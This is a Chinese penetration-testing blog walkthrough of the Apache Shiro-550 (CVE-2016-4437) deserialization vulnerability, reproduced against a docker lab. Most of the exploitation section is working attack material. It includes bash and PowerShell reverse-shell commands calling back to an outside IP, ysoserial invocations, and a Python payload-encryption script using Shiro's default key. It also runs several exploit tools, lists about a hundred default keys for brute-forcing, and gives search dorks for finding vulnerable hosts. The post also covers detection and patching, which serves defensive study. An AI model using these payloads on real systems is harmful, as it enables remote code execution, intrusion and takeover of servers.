# Apache Shiro 反序列化漏洞（Shiro-550 CVE-2016-4437） - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/14077804.html`](https://www.cnblogs.com/backlion/p/14077804.html)

### 0x00 漏洞描述

Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro 框架直观、易用，同时也能提供健壮的安全性。Apache Shiro 1.2.4 及以前版本中，加密的用户信息序列化后存储在名为 remember-me 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发 Java 反序列化漏洞，进而在目标机器上执行任意命令只要 rememberMe 的 AES 加密密钥泄露，无论 shiro 是什么版本都会导致反序列化漏洞。

### 0x01 影响版本

Apache Shiro <= 1.2.4

### 0x02 漏洞原理

Apache Shiro 框架提供了记住我的功能（RememberMe），关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。用户登陆成功后会生成经过加密并编码的 cookie。Apache Shiro 1.2.4 及以前版本中，Apache Shiro 默认使用了 CookieRememberMeManager，其处理 cookie 的流程是：得到 rememberMe 的 cookie 值 > Base64 解码–>AES 解密–>反序列化。然而 AES 的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的 RCE 漏洞

在服务端接收 cookie 值时，按照如下步骤来解析处理：
1、检索 RememberMe cookie 的值
2、Base 64 解码
3、使用 AES 解密(加密密钥硬编码)
4、进行反序列化操作（未作过滤处理）

但是，AES 加密的密钥 Key 被硬编码在代码里，意味着每个人通过源代码都能拿到 AES 加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES 加密，base64 编码后，作为 cookie 的 rememberMe 字段发送。Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞

### 0x03 漏洞原因

大概意思是，shiro 在登录处提供了 Remember Me 这个功能，来记录用户登录的凭证，然后 shiro 使用了 CookieRememberMeManager 类对用户的登陆凭证，也就是 Remember Me 的内容进行一系列处理：

使用 Java 序列化 ---> 使用密钥进行 AES 加密 ---> Base64 加密 ---> 得到加密后的 Remember Me 内容

同时在识别用户身份的时候，需要对 Remember Me 的字段进行解密，解密的顺序为：

Remember Me 加密内容 ---> Base64 解密 ---> 使用密钥进行 AES 解密 --->Java 反序列化

问题出在 AES 加密的密钥 Key 被硬编码在代码里，这意味着攻击者只要通过源代码找到 AES 加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES 加密，Base64 编码，然后将其作为 cookie 的 Remember Me 字段发送，Shiro 将 RememberMe 进行解密并且反序列化，最终造成反序列化漏洞。

### 0x04 漏洞利用条件

由于使用来 aes 加密，要想成功利用漏洞则需要获取 aes 的加密密钥，而在 shiro 的 1.2.4 之前版本中使用的是硬编码。其默认密钥的 base64 编码后的值为 kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为 cookie 加密发送，服务端接收后会解密并触发反序列化漏洞。 ### 0x05  漏洞搜索关键字 fofa 的搜索关键词：header="rememberme=deleteMe"github 搜索关键词:

```
securityManager.rememberMeManager.cipherKey  cookieRememberMeManager.setCipherKey  setCipherKey(Base64.decode
```

### 0x06  漏洞特征

shiro 反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段

### 0x07  环境搭建

1.下载镜像 docker pull medicean/vulapps:s_shiro_1 ![](img/877976a2bad968d499fc670c8fc219ed.png)2.直接运行镜像，将 docker 的 8080 端口映射到本地的 8080 上: docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1 ![](img/b5df8c715dee784799f05aed007267a1.png)3.访问地址：http://149.28.94.72:8080/，可以看到环境被成功搭建 ![](img/dd44b40eb6e643e09736db30a55c8b3b.png)或者：[`github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437`](https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437)

```
docker-compose up -d
```

```
服务启动后，访问 http://your-ip:8080 可使用 admin:vulhub 进行登录
```

### 0x08  漏洞复现

**一、最基本方式复现利用复现**1.ysoserial-0.0.6-SNAPSHOT-all.jar 文件下载：root@shiro:~/Shiro_exploit# wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar![](img/62487f34b859a8995e1d8eb181eb8292.png)2.访问漏洞靶场，并使用 burp 对其抓包，输入正确的用户名和密码，勾选 Remember Me 选项。查看返回包中 Set-Cookie 中是否存在 rememberMe=deleteMe 字段。![](img/76ddde08694c708d8330596b1e66c8ce.png)3.对登录的页面进行抓包![](img/d74d5d1872c0d0d37fb5cb9341544b2a.png)4.抓到包发送到 repeater，重放即可看到 cookie 中包含 rememberMe=deleteMe 字段![](img/2c10a8e139450d0640180a8bb804241e.png)5.然后在攻击机执行以下命令：（通过 ysoserial 中的 JRMP 监听模块，监听 1086 端口并执行反弹 shell 命令）
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1086 CommonsCollections4 “bash 命令” 注：payloads/JRMPClient 是结合 exploit/JRMPListener 使用的；
JRMPListener 是 ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据 发送到 Server 中，然后 Server 中进行反序列化操作，并开启指定端口，然后在通过 JRMPClient 去发送攻击 payload；
payloads/JRMPClient 生存的 payload 是发送给目标机器的，exploit/JRMPListener 是在自己服务器上使用的。然后我们来构造 payload 来进行反弹 shell 的操作，写好 bash 反弹 shell 的命令
bash -i >& /dev/tcp/149.28.94.72/2222   0>&1
然后转换成加密后的指令（去这个网站 http://www.jackson-t.ca/runtime-exec-payloads.html） ![](img/d34c072f34099359e2b9ef15d55a57ba.png)bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDkuMjguOTQuNzIvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i} 注：为什么要对反弹 shell 进行编码？在 exec()函数中，">"管道符是没有意义的，会被解析为其他的意义，而我们的反弹 shell 命令中又必须使用，所以需要编码。另外，StringTokenizer 类会破坏其中包含空格的参数，该类将命令字符串按空格分隔。诸如此类的东西 ls "My Directory"将被解释为 ls '"My' 'Directory"'6.最终在攻击机上执行的命令如下：java -cp  ysoserial-master-SNAPSHOT.jar   ysoserial.exploit.JRMPListener 1086 CommonsCollections4 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDkuMjguOTQuNzIvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i}” ![](img/c255c7bcf3ab17ca37ee9616fc9ae16f.png)7.使用 shiro.py 生成 payload，需要 python2 的环境，使用 Shiro 内置的默认密钥对 Payload 进行加密：shiro.py:import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == '__main__':    payload = encode_rememberme(sys.argv[1])   print "rememberMe={0}".format(payload.decode())8.对目标靶机进行 payload 加密处理 root@shiro:~/Shiro_exploit# python shiro.py 149.28.94.72:1099  //攻击机的 ip 地址和 java 监听端口，shiro.py 需要和 ysoserial.jar 放在同一个目录下。rememberMe=Js0Jb6NWTG6O1ZvE0Y6L2cXY9xbf/F6SGZHcoL11yHyKy3gRXdgGRmS3XUUCdq+mPLOc6WzlFpEqdpm+o1RS3fN8N2JWzDI7XI4zZLcI3V3SVhasOqoYX6Eb5s7AQLHePx6T7p8s5XTa5/pdny+bHGLoFJnCR8fa9P1VkcUAdvNuEEfEd4K+zYzSEmVDMdvgCLEx4FZ4zME52g+zGaMfn+L3FcXIy397e+L8FFHoMIayzxnl6D/17Z5hJdlx97xrqB31ZbdoIryiP1VmzDoqgP6ZEfewtH8k9bWyT5ZrSNwOe7FhcNxsrscTD+cboMqt5NUWNH9Jz4pk4VeHyMuAZaZ3TVb9ebfBThYnXvSHTwsEKlTp8sGPsCsKbbMCFKL3Q6qR+ri+15FozlEAsfvliA==![](img/8195ccc52fa310904821a68ba35c8ff3.png)9.然后在攻击机上监听 2222 端口，等待 shell 反弹![](img/386b075041473a4e95bd447e8e7d798d.png)10.将生成的 remeberMe 值添加到 cookie 字段内的 jessionid 后边，用分号隔开添加刚生成的 payload，然后将数据包放行![](img/0958fcc4c39b161d9774189bf0fc63a3.png)11.数据包发送之后查看攻击机中 java 监听接口和 nc 监听端口结果显示如下图![](img/f3880bfd63a545805dd1ea3f096f7cf6.png)![](img/f515cd8e50eae7aff7d416e253631245.png)**二、**Shiro_exploit 脚本利用复现********1.**使用 Shiro_exploit 的 poc 对目标靶机**key 的爆破检查****root@shiro:~/Shiro_exploit# python3  shiro_exploit.py -u   http://149.28.94.72:8080 ![](img/032f52c0eaa2ecd6c0ddc27e2aaa6b75.png)**![](img/40fdc36ff92771bd92d2fb380f01fad3.png)****2.使用 Shiro_exploit 的 poc 执行反弹 shell** root@shiro:~# git  clone  https://github.com/insightglacier/Shiro_exploit.gitroot@shiro:~/Shiro_exploit# pip3  install pycryptodome

```
<code-pre class="code-pre" id="pre-fJw6Qr" style="">python3 shiro_exploit.py -t 3 -u [`149.28.94.72:8080`](http://149.28.94.72:8080) -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDkuMjguOTQuNzIvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i}"</code-pre>
```

```
<code-pre class="code-pre" style="">![](img/01ceb0c2ba2b244ac9398c2e33db3854.png)</code-pre>
```

nc  -lvvp  2222![](img/446b0b27706744aab3ef0cab7cda290f.png)**3.使用 Shiro_exploit 的 poc 进行在目标靶机创建文件** <code-box id="4paKKH" style="">```
<code-pre class="code-pre" id="pre-ZcSSnD" style="">python3 shiro_exploit.py -t 3 -u [`149.28.94.72:8080`](http://149.28.94.72:8080) -p "touch test.txt"</code-pre> 
```</code-box> ![](img/e6f64ca52521507714cd805fd35e7d24.png)成功在服务器创建 a.txt 文件 ![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200527104527580-457092711.png)**4.使用 Shiro_exploit 的 poc 检测可用 gadget 的方式**python3  shiro_exploit.py -u [`149.28.94.72:8080      -t  3   -p   "ping -c 2  1m054t.dnslog.cn"   -k   "kPH+bIxk5D2deZiIxcaaaA=="`](http://149.28.94.72:8080      -t  3   -p   "ping -c 2  1m054t.dnslog.cn"   -k   "kPH+bIxk5D2deZiIxcaaaA==")![](img/a9c0b694071f63ba1332483c344031ef.png)dnslog 上会看到请求的域名，证明漏洞存在![](img/cb5a88badd1f71aa7a76d5302e916ee4.png)**三、ShiroExploit 图形化工具利用****复现******[`github.com/feihong-cs/ShiroExploit`](https://github.com/feihong-cs/ShiroExploit)Shiro550 无需提供 rememberMe Cooki![](img/bd858985221da22d267ed5b14f89a902.png)![](img/8d9d89635a0987a0199065e2e909e641.png)![](img/c8a46e674fe39da1678223789778ba89.png)![](img/64f5118dc74d967df84c5d7bc4a24875.png)攻击机执行:（可以看到成功反弹 shell)nc  -lvvp  3333    ![](img/96c90882bd7560ed6f154f6b7439ddb9.png)**四、ShiroScan 脚本利用****复现********使用**ShiroScan 脚本对**漏洞进行检查**root@shiro:~# git clone https://github.com/sv3nbeast/ShiroScan.gitroot@shiro:~#pip3 install -r requirments.txtroot@shiro:~/ShiroScan# python3 shiro_rce.py  http://149.28.94.72:8080/   "ping  ijinvv.dnslog.cn"![](img/8fe83c47142626777c508a5d65d3b221.png)

### 

```
五、shiro_crack.py 脚本利用****复现****
```

```
1.爆破模块漏洞检查

```

```

```
git  clone [`github.com/bkfish/Awesome_shiro`](https://github.com/bkfish/Awesome_shiro)
```

```

```
python3 shiro_crack.py http://149.28.94.72:8080/   m55a3c.dnslog.cn  #需要结合 http://dnslog.cn 
```

![](img/97e4226a3a64401c97c2d6d88ce066ad.png)

成功后查看记录,记录格式为 {{key}}.{{module}}.dnslogurl

```
kPH.bIxk5D2deZiIxcaaaA.CommonsCollections2.m55a3c.dnslog.cn 
```

可知成功的 key 为 kPH.bIxk5D2deZiIxcaaaA==,模块为 CommonsBeanutils2 因为 key 中包含==/+等符号.

![](img/2fd05dd8593d24722eb216b6ff21756e.png)其实网上有很多爆破模块和 key 的工具，但是爆破成功后一般只是打通，并不知道模块和 key 是什么，因为对于无回显的 rce，无论通没通，响应码均为 200。 本项目通过爆破模块和 key 结合 dnslog 间接获取成功的 key 和模块，原理即为 DNSlog 的内涵，Dns 在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息。

### **2.shiro_getshell 反弹 shell**root@shiro:~/Awesome_shiro/shiro_getshell# python3  shiro_getshell.py     -u    http://149.28.94.72:8080    -lh   149.28.94.72   -lp   3333![](img/d59be1ddc4d7b9e102b57e8d14df00c9.png)root@shiro:~# nc  -lvvp 3333![](img/bafd628a39f99559bae1bc4862ced39d.png)**3.批量检查**根据请求头，响应头做一个简单的测试-将有 shiro 的网站丢到 shiro.txt 中![](img/55abb842c4979534a42c54f50338180c.png)![](img/9cbc0ff40cad0e155babd6d8aa634789.png)![](img/b66b50b6d76674fc248094208151d27f.png)**六、ShiroScan 图像化工具利用****复现******[`github.com/fupinglee/ShiroScan`](https://github.com/fupinglee/ShiroScan)**1.漏洞检查**![](img/7260f9a3de8f03fa23d7397443e6b060.png)![](img/9be5994c6a8b6f3224ef60b8922053ee.png)**2.RCE 命令执行**![](img/08e3ae3f482e471203bdc7d4da69bb46.png)经测试只有 commonscollections8 和 commonscollections2 可以执行命令![](img/82722b3e7016f1547d7014eed3c3c290.png)![](img/0a59603da3e9f97e7b5458af173cd1c7.png)![](img/4b67da8a09c97cf5c900b3c1dac13ee1.png)**3.附上默认的****100key（可复制到检查 key 中）**

```
kPH+bIxk5D2deZiIxcaaaA==
```

```
4AvVhmFLUs0KTA3Kprsdag==
```

```
Z3VucwAAAAAAAAAAAAAAAA==
```

```
fCq+/xW488hMTCD+cmJ3aQ==
```

```
0AvVhmFLUs0KTA3Kprsdag==
```

```
1AvVhdsgUs0FSA3SDFAdag==
```

```
1QWLxg+NYmxraMoxAXu/Iw==
```

```
25BsmdYwjnfcWmnhAciDDg==
```

```
2AvVhdsgUs0FSA3SDFAdag==
```

```
3AvVhmFLUs0KTA3Kprsdag==
```

```
3JvYhmBLUs0ETA5Kprsdag==
```

```
r0e3c16IdVkouZgk1TKVMg==
```

```
5aaC5qKm5oqA5pyvAAAAAA==
```

```
5AvVhmFLUs0KTA3Kprsdag==
```

```
6AvVhmFLUs0KTA3Kprsdag==
```

```
6NfXkC7YVCV5DASIrEm1Rg==
```

```
6ZmI6I2j5Y+R5aSn5ZOlAA==
```

```
cmVtZW1iZXJNZQAAAAAAAA==
```

```
7AvVhmFLUs0KTA3Kprsdag==
```

```
8AvVhmFLUs0KTA3Kprsdag==
```

```
8BvVhmFLUs0KTA3Kprsdag==
```

```
9AvVhmFLUs0KTA3Kprsdag==
```

```
OUHYQzxQ/W9e/UjiAGu6rg==
```

```
a3dvbmcAAAAAAAAAAAAAAA==
```

```
aU1pcmFjbGVpTWlyYWNsZQ==
```

```
bWljcm9zAAAAAAAAAAAAAA==
```

```
bWluZS1hc3NldC1rZXk6QQ==
```

```
bXRvbnMAAAAAAAAAAAAAAA==
```

```
ZUdsaGJuSmxibVI2ZHc9PQ==
```

```
wGiHplamyXlVB11UXWol8g==
```

```
U3ByaW5nQmxhZGUAAAAAAA==
```

```
MTIzNDU2Nzg5MGFiY2RlZg==
```

```
L7RioUULEFhRyxM7a2R/Yg==
```

```
a2VlcE9uR29pbmdBbmRGaQ==
```

```
WcfHGU25gNnTxTlmJMeSpw==
```

```
OY//C4rhfwNxCQAQCrQQ1Q==
```

```
5J7bIJIV0LQSN3c9LPitBQ==
```

```
f/SY5TIve5WWzT4aQlABJA==
```

```
bya2HkYo57u6fWh5theAWw==
```

```
WuB+y2gcHRnY2Lg9+Aqmqg==
```

```
kPv59vyqzj00x11LXJZTjJ2UHW48jzHN
```

```
3qDVdLawoIr1xFd6ietnwg==
```

```
ZWvohmPdUsAWT3=KpPqda
```

```
YI1+nBV//m7ELrIyDHm6DQ==
```

```
6Zm+6I2j5Y+R5aS+5ZOlAA==
```

```
2A2V+RFLUs+eTA3Kpr+dag==
```

```
6ZmI6I2j3Y+R1aSn5BOlAA==
```

```
SkZpbmFsQmxhZGUAAAAAAA==
```

```
2cVtiE83c4lIrELJwKGJUw==
```

```
fsHspZw/92PrS3XrPW+vxw==
```

```
XTx6CKLo/SdSgub+OPHSrw==
```

```
sHdIjUN6tzhl8xZMG3ULCQ==
```

```
O4pdf+7e+mZe8NyxMTPJmQ==
```

```
HWrBltGvEZc14h9VpMvZWw==
```

```
rPNqM6uKFCyaL10AK51UkQ==
```

```
Y1JxNSPXVwMkyvES/kJGeQ==
```

```
lT2UvDUmQwewm6mMoiw4Ig==
```

```
MPdCMZ9urzEA50JDlDYYDg==
```

```
xVmmoltfpb8tTceuT5R7Bw==
```

```
c+3hFGPjbgzGdrC+MHgoRQ==
```

```
ClLk69oNcA3m+s0jIMIkpg==
```

```
Bf7MfkNR0axGGptozrebag==
```

```
1tC/xrDYs8ey+sa3emtiYw==
```

```
ZmFsYWRvLnh5ei5zaGlybw==
```

```
cGhyYWNrY3RmREUhfiMkZA==
```

```
IduElDUpDDXE677ZkhhKnQ==
```

```
yeAAo1E8BOeAYfBlm4NG9Q==
```

```
cGljYXMAAAAAAAAAAAAAAA==
```

```
2itfW92XazYRi5ltW0M2yA==
```

```
XgGkgqGqYrix9lI6vxcrRw==
```

```
ertVhmFLUs0KTA3Kprsdag==
```

```
5AvVhmFLUS0ATA4Kprsdag==
```

```
s0KTA3mFLUprK4AvVhsdag==
```

```
hBlzKg78ajaZuTE0VLzDDg==
```

```
9FvVhtFLUs0KnA3Kprsdyg==
```

```
d2ViUmVtZW1iZXJNZUtleQ==
```

```
yNeUgSzL/CfiWw1GALg6Ag==
```

```
NGk/3cQ6F5/UNPRh8LpMIg==
```

```
4BvVhmFLUs0KTA3Kprsdag==
```

```
MzVeSkYyWTI2OFVLZjRzZg==
```

```
CrownKey==a12d/dakdad
```

```
empodDEyMwAAAAAAAAAAAA==
```

```
A7UzJgh1+EWj5oBFi+mSgw==
```

```
YTM0NZomIzI2OTsmIzM0NTueYQ==
```

```
c2hpcm9fYmF0aXMzMgAAAA==
```

```
i45FVt72K2kLgvFrJtoZRw==
```

```
U3BAbW5nQmxhZGUAAAAAAA==
```

```
ZnJlc2h6Y24xMjM0NTY3OA==
```

```
Jt3C93kMR9D5e8QzwfsiMw==
```

```
MTIzNDU2NzgxMjM0NTY3OA==
```

```
vXP33AonIp9bFwGl7aT7rA==
```

```
V2hhdCBUaGUgSGVsbAAAAA==
```

```
Z3h6eWd4enklMjElMjElMjE=
```

```
Q01TX0JGTFlLRVlfMjAxOQ==
```

```
ZAvph3dsQs0FSL3SDFAdag==
```

```
Is9zJ3pzNh2cgTHB4ua3+Q==
```

```
NsZXjXVklWPZwOfkvk6kUA==
```

```
GAevYnznvgNCURavBhCr1w==
```

```
66v1O8keKNV3TTcGPK1wzg==
```

```
SDKOLKn2J1j/2BHjeZwAoQ==
```

**八、shiro_tool 命令行工具利用****复现******

```
[`xz.aliyun.com/forum/upload/affix/shiro_tool.zip`](https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip) 
```

```
root@shiro:~/shiro_tool# java -jar shiro_tool.jar   http://149.28.94.72:8080 
```

![](img/6513a649994f665d4da5e213c9e25b0e.png)选择 1 然后输入命令：curl 7dxz8d.dnslog.cn![](img/1a04c6f1aebf93359b2ea8765939f8bf.png)bash=bash -i >& /dev/tcp/149.28.94.72/2222   0>&1 ![](img/d7ab8e3691aff27c25cbe5cd540f02e7.png)![](img/2fe28637f9f4f251b44a0fd5059244c2.png)输入命令：output=on              #开启执行远程命令输入命令：x=whoami     #可执行系统命令![](img/211310a06334cbd83ed123fb205f93d2.png)![](img/7576fc6951e29078c83ce3aa2662679c.png)

### 0x09  漏洞插件检查

https://github.com/Daybr4ak/ShiroScan（burp 插件 Shiroscan）![](img/5263c860962701f5c9e40d43fb449d51.png)![](img/15843d0d01faa1033dd53a4aea131f93.png)或者通过 bupusit 抓取关键 cookie 值：rememberMe=deleteMe![](img/70938c413445513b30ecda17d2ace391.png) 

### 0x10  漏洞修复

1.升级 Shiro 到最新版 2.如果在配置里配置了密钥, 那么请一定不要使用网上的密钥, 一定不要! ! 请自己 base64 一个 AES 的密钥, 或者利用官方提供的方法生成密钥: org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey().public class GenerateCipherKey { /**  * 随机生成秘钥，参考 org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey(int)  * @return  */ public static byte[] generateNewKey() {     KeyGenerator kg;     try {         kg = KeyGenerator.getInstance("AES");     } catch (NoSuchAlgorithmException var5) {         String msg = "Unable to acquire AES algorithm.  This is required to function.";         throw new IllegalStateException(msg, var5);     }     kg.init(128);     SecretKey key = kg.generateKey();     byte[] encoded = key.getEncoded();     return encoded; }}3.升级对应 JDK 版本到 8u191/7u201/6u211/11.0.1 以上 4.WAF 拦截 Cookie 中长度过大的 rememberMe 值

### 0x11 漏洞总结

```
测试时, 首先需要对网站基本信息有一个收集, 要知道它是什么系统, linux 与 windows 反弹 shell 的命令不同 ：
1.linux(需要编码处理): bash -i >& /dev/tcp/149.28.94.72/2222  0>&12.windwos(不需要编码处理): powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 149.28.94.72  -port 22223.响应包中出现<rememberMe=deleteMe>可以用来大概判断是否使用了 Shiro.4.关于反弹 shell 命令, 如果不编码会命令执行失败. 简单说就是反弹 shell 的命令中包含一些特殊的符号, 在进行反序列化的时候会导致命令无法正常解析 5.测试时, 最好先使用 ping 命令和 dnlslog 用来检测漏洞是否存在, 因为复杂的命令可能因为各种原因执行失败, 影响判断.6.关于利用模块的选择,可以对 CommonsCollections1, CommonsCollections3, CommonsCollections5 分别挨过测试，也可以利用图形化工具来判断选择哪个利用模块  
```